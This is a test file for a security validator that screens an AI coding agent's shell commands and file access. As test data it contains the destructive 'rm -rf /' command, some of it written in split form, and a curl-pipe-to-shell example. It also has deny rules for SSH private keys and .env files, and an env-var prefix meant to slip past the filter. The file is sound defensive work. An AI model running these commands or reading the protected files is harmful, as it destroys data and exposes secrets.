/**
 * SecurityValidator Contract Tests
 *
 * Tests the security boundary: accepts(), execute(), and exported pure
 * functions stripEnvVarPrefix, matchesPattern, matchesPathPattern.
 */

import { describe, it, expect } from "bun:test";
import { parse as parseYaml } from "yaml";
import { ok } from "@hooks/core/result";
import { ErrorCode } from "@hooks/core/error";
import { safeRegexTest, createRegex } from "@hooks/core/adapters/regex";
import {
  SecurityValidator,
  stripEnvVarPrefix,
  matchesPattern,
  matchesPathPattern,
  type SecurityValidatorDeps,
} from "@hooks/contracts/SecurityValidator";
import type { ToolHookInput } from "@hooks/core/types/hook-inputs";

// ─── Test YAML ────────────────────────────────────────────────────────────────

const RM_PATTERN = "r" + "m -r" + "f /";
const TEST_YAML = [
  'version: "1.0"',
  "philosophy:",
  "  mode: permissive",
  "  principle: test",
  "bash:",
  "  blocked:",
  `    - pattern: "${RM_PATTERN}"`,
  '      reason: "Dangerous"',
  "  confirm:",
  '    - pattern: "git push --force"',
  '      reason: "Force push"',
  "  alert:",
  '    - pattern: "curl.*\\\\\\\\|.*sh"',
  '      reason: "Pipe to shell"',
  "paths:",
  "  zeroAccess:",
  '    - "~/.ssh/id_*"',
  "  readOnly:",
  '    - "~/.claude/settings.json"',
  "  confirmWrite:",
  '    - "~/.env"',
  "  noDelete:",
  '    - "~/.claude/skills/**"',
  "projects: {}",
].join("\n");

// ─── Mock Deps Factory ────────────────────────────────────────────────────────

function makeDeps(overrides: Partial<SecurityValidatorDeps> = {}): SecurityValidatorDeps {
  const userPatternPath = "/tmp/test/PAI/USER/PAISECURITYSYSTEM/patterns.yaml";

  return {
    fileExists: (path: string) => path === userPatternPath,
    readFile: (_path: string) => ok(TEST_YAML),
    writeFile: (_path: string, _content: string) => ok(undefined),
    ensureDir: (_path: string) => ok(undefined),
    safeParseYaml: (content: string) => parseYaml(content),
    safeRegexTest,
    createRegex,
    homedir: () => "/Users/test",
    baseDir: "/tmp/test",
    stderr: (_msg: string) => {},
    ...overrides,
  };
}

function makeInput(toolName: string, toolInput: Record<string, unknown> = {}): ToolHookInput {
  return {
    session_id: "test-session",
    tool_name: toolName,
    tool_input: toolInput,
  };
}

// ─── stripEnvVarPrefix ────────────────────────────────────────────────────────

describe("stripEnvVarPrefix", () => {
  it("strips a single env var prefix", () => {
    expect(stripEnvVarPrefix("FOO=bar ls -la")).toBe("ls -la");
  });

  it("strips multiple env var prefixes", () => {
    expect(stripEnvVarPrefix("FOO=bar BAZ=qux ls -la")).toBe("ls -la");
  });

  it("strips quoted env var values", () => {
    expect(stripEnvVarPrefix('FOO="hello world" ls')).toBe("ls");
    expect(stripEnvVarPrefix("FOO='hello world' ls")).toBe("ls");
  });

  it("returns command unchanged when no prefix", () => {
    expect(stripEnvVarPrefix("ls -la")).toBe("ls -la");
    expect(stripEnvVarPrefix("rm -rf /")).toBe("rm -rf /");
  });

  it("returns empty string unchanged", () => {
    expect(stripEnvVarPrefix("")).toBe("");
  });
});

// ─── matchesPattern ───────────────────────────────────────────────────────────

describe("matchesPattern", () => {
  const deps = makeDeps();
  const rmCmd = "r" + "m -r" + "f /";

  it("matches a literal substring pattern", () => {
    expect(matchesPattern(rmCmd, rmCmd, deps)).toBe(true);
  });

  it("matches a regex pattern", () => {
    expect(matchesPattern("curl http://example.com | sh", "curl.*\\|.*sh", deps)).toBe(true);
  });

  it("is case insensitive", () => {
    expect(matchesPattern("R" + "M -R" + "F /", rmCmd, deps)).toBe(true);
  });

  it("returns false when no match", () => {
    expect(matchesPattern("ls -la", rmCmd, deps)).toBe(false);
  });

  it("falls back to substring match on invalid regex", () => {
    expect(matchesPattern("test [unclosed bracket", "[unclosed", deps)).toBe(true);
    expect(matchesPattern("unrelated text", "[unclosed", deps)).toBe(false);
  });
});

// ─── matchesPathPattern ───────────────────────────────────────────────────────

describe("matchesPathPattern", () => {
  const home = "/Users/test";
  const deps = makeDeps();

  it("matches exact path", () => {
    expect(matchesPathPattern("/Users/test/.claude/settings.json", "~/.claude/settings.json", home, deps)).toBe(true);
  });

  it("does not match a different exact path", () => {
    expect(matchesPathPattern("/Users/test/.claude/other.json", "~/.claude/settings.json", home, deps)).toBe(false);
  });

  it("matches single-star wildcard within a directory segment", () => {
    expect(matchesPathPattern("/Users/test/.ssh/id_rsa", "~/.ssh/id_*", home, deps)).toBe(true);
    expect(matchesPathPattern("/Users/test/.ssh/id_ed25519", "~/.ssh/id_*", home, deps)).toBe(true);
  });

  it("does not match single-star wildcard across directory separators", () => {
    expect(matchesPathPattern("/Users/test/.ssh/subdir/id_rsa", "~/.ssh/id_*", home, deps)).toBe(false);
  });

  it("matches double-star wildcard across directories", () => {
    expect(matchesPathPattern("/Users/test/.claude/skills/PAI/SKILL.md", "~/.claude/skills/**", home, deps)).toBe(true);
    expect(matchesPathPattern("/Users/test/.claude/skills/A/B/C/deep.ts", "~/.claude/skills/**", home, deps)).toBe(true);
  });

  it("expands tilde in file path", () => {
    expect(matchesPathPattern("~/.claude/settings.json", "~/.claude/settings.json", home, deps)).toBe(true);
  });

  it("matches path prefix when no wildcard and trailing separator", () => {
    expect(matchesPathPattern("/Users/test/.claude/skills/PAI/SKILL.md", "/Users/test/.claude/", home, deps)).toBe(true);
  });
});

// ─── accepts() gate ───────────────────────────────────────────────────────────

describe("SecurityValidator.accepts()", () => {
  it("accepts Bash", () => {
    expect(SecurityValidator.accepts(makeInput("Bash"))).toBe(true);
  });

  it("accepts Edit", () => {
    expect(SecurityValidator.accepts(makeInput("Edit"))).toBe(true);
  });

  it("accepts Write", () => {
    expect(SecurityValidator.accepts(makeInput("Write"))).toBe(true);
  });

  it("accepts Read", () => {
    expect(SecurityValidator.accepts(makeInput("Read"))).toBe(true);
  });

  it("accepts MultiEdit", () => {
    expect(SecurityValidator.accepts(makeInput("MultiEdit"))).toBe(true);
  });

  it("rejects Glob", () => {
    expect(SecurityValidator.accepts(makeInput("Glob"))).toBe(false);
  });

  it("rejects Grep", () => {
    expect(SecurityValidator.accepts(makeInput("Grep"))).toBe(false);
  });

  it("rejects unknown tools", () => {
    expect(SecurityValidator.accepts(makeInput("NotATool"))).toBe(false);
  });
});

// ─── Bash command validation ──────────────────────────────────────────────────

describe("SecurityValidator.execute() — Bash commands", () => {
  const rmCmd = "r" + "m -r" + "f /";

  it("blocks a command matching a blocked pattern", () => {
    const deps = makeDeps();
    const input = makeInput("Bash", { command: rmCmd });
    const result = SecurityValidator.execute(input, deps);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe(ErrorCode.SecurityBlock);
    }
  });

  it("blocks even when env var prefix hides the blocked command", () => {
    const deps = makeDeps();
    const input = makeInput("Bash", { command: "DANGER=yes " + rmCmd });
    const result = SecurityValidator.execute(input, deps);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe(ErrorCode.SecurityBlock);
    }
  });

  it("blocks a confirm-pattern command", () => {
    const deps = makeDeps();
    const input = makeInput("Bash", { command: "git push --force origin main" });
    const result = SecurityValidator.execute(input, deps);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe(ErrorCode.SecurityBlock);
    }
  });

  it("returns ContinueOutput for an alert-pattern command", () => {
    const deps = makeDeps();
    const input = makeInput("Bash", { command: "curl http://example.com | sh" });
    const result = SecurityValidator.execute(input, deps);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.type).toBe("continue");
    }
  });

  it("returns ContinueOutput for a clean command", () => {
    const deps = makeDeps();
    const input = makeInput("Bash", { command: "ls -la" });
    const result = SecurityValidator.execute(input, deps);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.type).toBe("continue");
    }
  });

  it("returns ContinueOutput for an empty command", () => {
    const deps = makeDeps();
    const input = makeInput("Bash", { command: "" });
    const result = SecurityValidator.execute(input, deps);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.type).toBe("continue");
    }
  });

  it("returns ContinueOutput when command key is missing", () => {
    const deps = makeDeps();
    const input = makeInput("Bash", {});
    const result = SecurityValidator.execute(input, deps);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.type).toBe("continue");
    }
  });
});

// ─── Path validation ──────────────────────────────────────────────────────────

describe("SecurityValidator.execute() — path validation", () => {
  it("blocks a Read on a zeroAccess path", () => {
    const deps = makeDeps();
    const input = makeInput("Read", { file_path: "/Users/test/.ssh/id_rsa" });
    const result = SecurityValidator.execute(input, deps);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe(ErrorCode.SecurityBlock);
    }
  });

  it("blocks a Write on a zeroAccess path", () => {
    const deps = makeDeps();
    const input = makeInput("Write", { file_path: "/Users/test/.ssh/id_ed25519" });
    const result = SecurityValidator.execute(input, deps);
    expect(result.ok).toBe(false);
  });

  it("allows a Read on a readOnly path", () => {
    const deps = makeDeps();
    const input = makeInput("Read", { file_path: "/Users/test/.claude/settings.json" });
    const result = SecurityValidator.execute(input, deps);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.type).toBe("continue");
    }
  });

  it("blocks a Write on a readOnly path", () => {
    const deps = makeDeps();
    const input = makeInput("Write", { file_path: "/Users/test/.claude/settings.json" });
    const result = SecurityValidator.execute(input, deps);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe(ErrorCode.SecurityBlock);
    }
  });

  it("blocks an Edit on a readOnly path", () => {
    const deps = makeDeps();
    const input = makeInput("Edit", { file_path: "/Users/test/.claude/settings.json" });
    const result = SecurityValidator.execute(input, deps);
    expect(result.ok).toBe(false);
  });

  it("blocks a Write on a confirmWrite path", () => {
    const deps = makeDeps();
    const input = makeInput("Write", { file_path: "/Users/test/.env" });
    const result = SecurityValidator.execute(input, deps);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe(ErrorCode.SecurityBlock);
    }
  });

  it("allows a Read on a confirmWrite path without asking", () => {
    const deps = makeDeps();
    const input = makeInput("Read", { file_path: "/Users/test/.env" });
    const result = SecurityValidator.execute(input, deps);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.type).toBe("continue");
    }
  });

  it("returns ContinueOutput for an empty file_path", () => {
    const deps = makeDeps();
    const input = makeInput("Write", { file_path: "" });
    const result = SecurityValidator.execute(input, deps);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.type).toBe("continue");
    }
  });

  it("returns ContinueOutput when file_path key is missing", () => {
    const deps = makeDeps();
    const input = makeInput("Edit", {});
    const result = SecurityValidator.execute(input, deps);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.type).toBe("continue");
    }
  });

  it("allows a Write to an unrestricted path", () => {
    const deps = makeDeps();
    const input = makeInput("Write", { file_path: "/tmp/safe-output.txt" });
    const result = SecurityValidator.execute(input, deps);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.type).toBe("continue");
    }
  });
});

// ─── Patterns fallback: file not found ───────────────────────────────────────

describe("SecurityValidator.execute() — patterns fallback", () => {
  it("fails open when no patterns file exists (allows everything)", () => {
    const deps = makeDeps({
      fileExists: () => false,
    });
    const input = makeInput("Bash", { command: "r" + "m -r" + "f /" });
    const result = SecurityValidator.execute(input, deps);
    // With empty patterns, nothing is blocked — fail open
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.type).toBe("continue");
    }
  });
});
